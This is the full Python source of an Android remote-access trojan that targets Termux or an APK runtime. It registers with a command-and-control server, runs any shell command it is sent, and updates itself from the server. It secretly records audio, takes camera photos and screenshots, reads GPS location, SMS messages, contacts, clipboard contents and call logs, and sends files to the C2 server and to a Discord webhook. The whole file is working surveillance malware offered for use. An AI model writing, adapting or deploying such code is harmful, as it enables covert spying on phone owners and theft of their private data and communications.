import sys, os, subprocess, requests, time, platform, json

# --- Configuration ---
C2_URL = "http://YOUR_C2_SERVER_IP:8080"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
HEARTBEAT_INTERVAL = 5

# --- Runtime Detection ---
def is_termux():
    return os.path.exists("/data/data/com.termux") or "com.termux" in os.environ.get("PREFIX", "")

def is_apk():
    try:
        from jnius import autoclass
        return True
    except: return False

RUNTIME = "termux" if is_termux() else ("apk" if is_apk() else "unknown")
TEMP_DIR = os.path.join(os.getenv("PREFIX", "/data/data/com.termux/files/usr"), "tmp") if RUNTIME == "termux" else os.getenv("EXTERNAL_STORAGE", "/sdcard")

# --- Stateful Shell Class for Android ---
class StatefulShell:
    def __init__(self):
        # Start in Termux home (~) which always has permissions, /sdcard needs termux-setup-storage
        self.cwd = os.path.expanduser("~")
        if os.path.exists("/sdcard") and os.access("/sdcard", os.R_OK):
            self.cwd = "/sdcard"
    
    def execute(self, command):
        command = command.strip()
        if not command: return ""
        if command.lower().startswith('cd '):
            try:
                new_dir = command[3:].strip()
                if not os.path.isabs(new_dir): new_dir = os.path.join(self.cwd, new_dir)
                os.chdir(new_dir)
                self.cwd = os.getcwd()
                return f"Changed directory to: {self.cwd}"
            except Exception as e: return f"Error changing directory: {e}"
        try:
            shell_bin = "/data/data/com.termux/files/usr/bin/sh" if RUNTIME == "termux" else "/system/bin/sh"
            if not os.path.exists(shell_bin): shell_bin = "/bin/sh"
            result = subprocess.run([shell_bin, "-c", command], cwd=self.cwd, capture_output=True, text=True, errors='ignore', timeout=60)
            return result.stdout + result.stderr if (result.stdout + result.stderr) else "Command executed."
        except Exception as e: return f"Error executing command: {e}"

# --- Helper Functions ---
def post_output(client_id, cmd_id, command_line, output):
    try:
        short_out = (output[:500] + "...") if len(output) > 500 else output
        requests.post(f"{C2_URL}/report/{client_id}", json={'cmd_id': cmd_id, 'output': short_out}, timeout=10)
    except: pass
    try:
        header = f"**[Result]** `{client_id[:8]}` (CMD: `{command_line}`)\n"
        if len(output) > 1900:
            temp_path = os.path.join(TEMP_DIR, f"res_{cmd_id}.txt")
            with open(temp_path, "w", encoding="utf-8") as f: f.write(output)
            with open(temp_path, "rb") as f:
                requests.post(DISCORD_WEBHOOK_URL, data={"content": header}, files={"file": (f"result_{cmd_id}.txt", f.read())})
            if os.path.exists(temp_path): os.remove(temp_path)
        else:
            requests.post(DISCORD_WEBHOOK_URL, json={"content": f"{header}```\n{output}\n```"})
    except: pass

def exfiltrate_file(filepath, client_id=None, message=""):
    try:
        if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
            return f"File exfiltration failed: '{os.path.basename(filepath)}' is missing or empty."
        file_size = os.path.getsize(filepath)
        if file_size > 20_000_000 and client_id:
            with open(filepath, 'rb') as f:
                requests.post(f"{C2_URL}/loot/{client_id}", files={"file": (os.path.basename(filepath), f.read())}, timeout=60)
            return f"File exported to C2 exfiltrated folder ({file_size/1e6:.1f}MB)."
        with open(filepath, 'rb') as f:
            r = requests.post(DISCORD_WEBHOOK_URL, data={"content": message}, files={"file": (os.path.basename(filepath), f.read())})
            if r.status_code >= 400 and client_id:
                f.seek(0)
                requests.post(f"{C2_URL}/loot/{client_id}", files={"file": (os.path.basename(filepath), f.read())}, timeout=60)
                return f"Discord rejected file. Exported to C2 instead ({file_size/1e6:.1f}MB)."
        return ""
    except Exception as e:
        return f"File exfiltration failed: {e}"
    finally:
        if os.path.exists(filepath):
            try: os.remove(filepath)
            except: pass

# =========================================================================
# Hardware Interaction (Auto-Detects Termux:API vs Plyer/APK)
# =========================================================================

def _run_termux_cmd(cmd_list, timeout=15):
    """Helper to run termux-api commands silently."""
    try:
        res = subprocess.run(cmd_list, capture_output=True, text=True, timeout=timeout)
        return res.stdout.strip(), res.returncode == 0
    except Exception as e:
        return str(e), False

def get_geolocation():
    if RUNTIME == "termux":
        # --- Termux:API (Real GPS!) ---
        out, ok = _run_termux_cmd(["termux-location", "-p", "gps", "-r", "once"], timeout=20)
        if ok and out:
            try:
                data = json.loads(out)
                lat = data.get("latitude", "N/A")
                lon = data.get("longitude", "N/A")
                acc = data.get("accuracy", "N/A")
                return (f"Source: Android GPS (Termux:API)\n"
                        f"Coords: Lat={lat}, Lon={lon}\n"
                        f"Accuracy: {acc}m\n"
                        f"Maps: https://maps.google.com/?q={lat},{lon}"), None
            except: pass
    elif RUNTIME == "apk":
        try:
            from plyer import gps as _gps
            # Plyer GPS is async - fallback to IP
        except: pass
    
    # IP Fallback (works everywhere)
    try:
        r = requests.get('https://ipinfo.io/json', timeout=10); data = r.json()
        loc = data.get('loc', 'N/A').split(','); lat, lon = (loc[0], loc[1]) if len(loc) == 2 else ('N/A', 'N/A')
        return (f"Source: IP-based (INACCURATE)\nIP: {data.get('ip', 'N/A')}\n"
                f"Location: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}\n"
                f"Coords: Lat={lat}, Lon={lon}\nMaps: https://maps.google.com/?q={lat},{lon}"), None
    except Exception as e: return None, f"Geolocation failed: {e}"

def take_webcam_photo(camera_id=0):
    filepath = os.path.join(TEMP_DIR, "cam.jpg")
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-camera-photo", "-c", str(camera_id), filepath], timeout=25)
        if ok and os.path.exists(filepath):
            return filepath, None
        return None, f"Termux camera failed: {out}. Make sure Termux:API is installed and camera permission is granted."
    elif RUNTIME == "apk":
        return None, "APK Camera requires foreground service. Use Termux:API for testing."
    return None, "Unknown runtime, camera not supported."

def record_audio(seconds=10):
    filepath = os.path.join(TEMP_DIR, "mic.m4a")
    if RUNTIME == "termux":
        # Start recording (AAC format = playable everywhere)
        _run_termux_cmd(["termux-microphone-record", "-f", filepath, "-l", str(seconds), "-e", "aac"], timeout=3)
        time.sleep(seconds + 2) # Wait for recording to finish
        _run_termux_cmd(["termux-microphone-record", "-q"], timeout=3) # Stop
        if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
            return filepath, None
        return None, "Termux audio recording failed. Grant microphone permission to Termux:API."
    elif RUNTIME == "apk":
        try:
            from plyer import audio
            audio.file_path = filepath
            audio.start()
            time.sleep(seconds)
            audio.stop()
            return filepath, None
        except Exception as e:
            return None, f"APK Audio failed: {e}"
    return None, "Unknown runtime, audio not supported."

def take_screenshot():
    filepath = os.path.join(TEMP_DIR, "ss.png")
    if RUNTIME == "termux":
        # termux-screenshot requires Termux:X11 or root... try screencap
        out, ok = _run_termux_cmd(["su", "-c", f"screencap -p {filepath}"], timeout=10)
        if ok and os.path.exists(filepath):
            return filepath, None
        return None, "Screenshot requires ROOT (su). Device is not rooted."
    return None, "Screenshot not available on this runtime."

def get_battery_info():
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-battery-status"], timeout=5)
        if ok: return out, None
    return None, "Battery info not available."

def get_sms_list(limit=10):
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-sms-list", "-l", str(limit)], timeout=10)
        if ok: return out, None
        return None, "SMS access failed. Grant SMS permission to Termux:API."
    return None, "SMS reading only available via Termux:API."

def get_contacts():
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-contact-list"], timeout=10)
        if ok: return out, None
        return None, "Contacts access failed. Grant contacts permission to Termux:API."
    return None, "Contacts reading only available via Termux:API."

def get_clipboard():
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-clipboard-get"], timeout=5)
        if ok: return out if out else "(clipboard empty)", None
    return None, "Clipboard not available."

def vibrate_device(duration_ms=500):
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-vibrate", "-d", str(duration_ms)], timeout=3)
        if ok: return "Device vibrated.", None
    return None, "Vibrate not available."

def send_toast(message):
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-toast", message], timeout=3)
        if ok: return "Toast displayed on target.", None
    return None, "Toast not available."

def get_call_log(limit=20):
    if RUNTIME == "termux":
        out, ok = _run_termux_cmd(["termux-call-log", "-l", str(limit)], timeout=10)
        if ok and out:
            try:
                calls = json.loads(out)
                formatted = []
                for c in calls:
                    name = c.get('name', 'Unknown')
                    number = c.get('number', 'N/A')
                    call_type = c.get('type', 'N/A')
                    duration = c.get('duration', '0')
                    date = c.get('date', 'N/A')
                    formatted.append(f"{call_type:8s} | {name:20s} | {number:15s} | {duration}s | {date}")
                return "\n".join(formatted) if formatted else "No call logs found.", None
            except: return out, None
        return None, "Call log access failed. Grant Phone/Call Log permission to Termux:API."
    return None, "Call log only available via Termux:API."

def self_update():
    try:
        r = requests.get(f"{C2_URL}/update", timeout=30)
        if r.status_code == 200:
            script_path = os.path.abspath(sys.argv[0])
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(r.text)
            os.execv(sys.executable, [sys.executable, script_path])
        else:
            return f"C2 returned {r.status_code}. No update available."
    except Exception as e:
        return f"Self-update failed: {e}"

# --- Main Logic ---
def main():
    shell = StatefulShell()
    
    # Build OS info string
    if RUNTIME == "apk":
        try:
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            os_info = f"Android {Build.VERSION.RELEASE} (APK)"
        except: os_info = f"Android (APK) {platform.release()}"
    elif RUNTIME == "termux":
        os_info = f"Android/Termux {platform.release()} (-ph)"
    else:
        os_info = f"Linux {platform.release()} (-ph)"
        
    while True:
        client_id = None
        while not client_id:
            try:
                r = requests.post(f"{C2_URL}/register", json={'os_info': os_info}, timeout=10)
                r.raise_for_status()
                client_id = r.json().get('client_id')
            except Exception:
                time.sleep(HEARTBEAT_INTERVAL)
                
        while True:
            try:
                r = requests.post(f"{C2_URL}/heartbeat/{client_id}", json={'cwd': shell.cwd}, timeout=10)
                r.raise_for_status()
                tasks = r.json().get('tasks', [])
                for task in tasks:
                    cmd_id = task.get('cmd_id')
                    command_line = task.get('command', '').strip()
                    if not command_line: continue
                    parts = command_line.split()
                    cmd = parts[0].lower()
                    output = ""
                    
                    # --- Special Commands ---
                    if cmd in ["geolocate", "geo"]: 
                        report, err = get_geolocation(); output = err if err else report

                    elif cmd in ["screenshot", "ss"]: 
                        filepath, err = take_screenshot(); output = err if err else exfiltrate_file(filepath, client_id, f"Screenshot: `{client_id}`")

                    elif cmd in ["webcam", "wc"]: 
                        cam_id = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                        filepath, err = take_webcam_photo(cam_id); output = err if err else exfiltrate_file(filepath, client_id, f"Android Cam{cam_id}: `{client_id}`")

                    elif cmd in ["record_audio", "rec_a"]: 
                        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        filepath, err = record_audio(seconds); output = err if err else exfiltrate_file(filepath, client_id, f"Android Audio ({seconds}s): `{client_id}`")

                    elif cmd in ["export", "exp"]:
                        filepath = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                        output = exfiltrate_file(filepath, client_id, f"Export: `{filepath}`") if filepath else "Error: filename required."

                    elif cmd == "sys_upload":
                        filename = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                        if filename:
                            try:
                                r = requests.get(f"{C2_URL}/serve/{filename}", timeout=30)
                                if r.status_code == 200:
                                    save_path = os.path.join(shell.cwd, filename)
                                    with open(save_path, "wb") as f: f.write(r.content)
                                    output = f"Uploaded `{filename}` to Android `{shell.cwd}`."
                                else: output = f"Failed to download {filename} from C2."
                            except Exception as e: output = f"sys_upload error: {e}"
                        else: output = "sys_upload error: no filename"

                    # --- Termux:API Bonus Commands ---
                    elif cmd == "battery":
                        report, err = get_battery_info(); output = err if err else report
                    elif cmd == "sms":
                        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        report, err = get_sms_list(limit); output = err if err else report
                    elif cmd == "contacts":
                        report, err = get_contacts(); output = err if err else report
                    elif cmd == "clipboard":
                        report, err = get_clipboard(); output = err if err else report
                    elif cmd == "vibrate":
                        ms = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 500
                        report, err = vibrate_device(ms); output = err if err else report
                    elif cmd == "toast":
                        msg = command_line.split(maxsplit=1)[1] if len(parts) > 1 else "Hello from Fsociety"
                        report, err = send_toast(msg); output = err if err else report
                    elif cmd == "callog":
                        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
                        report, err = get_call_log(limit); output = err if err else report
                    elif cmd == "sys_update":
                        output = self_update() or "Restarting with new payload..."

                    else: 
                        output = shell.execute(command_line)
                    
                    if output:
                        post_output(client_id, cmd_id, command_line, str(output))
            except requests.exceptions.RequestException:
                break
            except Exception:
                pass

            time.sleep(HEARTBEAT_INTERVAL)

if __name__ == '__main__':
    main()
